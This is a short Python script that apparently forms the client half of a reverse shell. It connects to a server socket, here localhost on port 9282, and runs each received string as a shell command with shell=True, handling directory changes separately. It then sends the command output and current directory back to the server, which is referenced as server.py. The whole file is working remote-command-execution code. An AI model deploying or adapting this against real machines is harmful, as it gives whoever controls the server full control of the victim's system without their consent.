import os
import socket
import subprocess

s = socket.socket()
host = 'localhost'
port = 9282
s.connect((host, port))
while 1:
    data = s.recv(8192)
    try:
        if data[:3].decode("utf-8") == 'cd ':
            os.chdir(data[3:].decode("utf-8"))
            s.send(str.encode("/"  # validation for response, @server.py
                              + str(os.getcwd())
                              + ": "))
            print(os.getcwd())
            continue
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode(
                "utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        assert isinstance(output_bytes, object)
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode("/"  # validation for response, @server.py
                          + output_str
                          + str(os.getcwd())
                          + ": "))
        print(output_str)
    except FileNotFoundError as msg:
        s.send(str.encode("#{0}".format(str(msg)))) # validation for error response, @server.py
s.close()
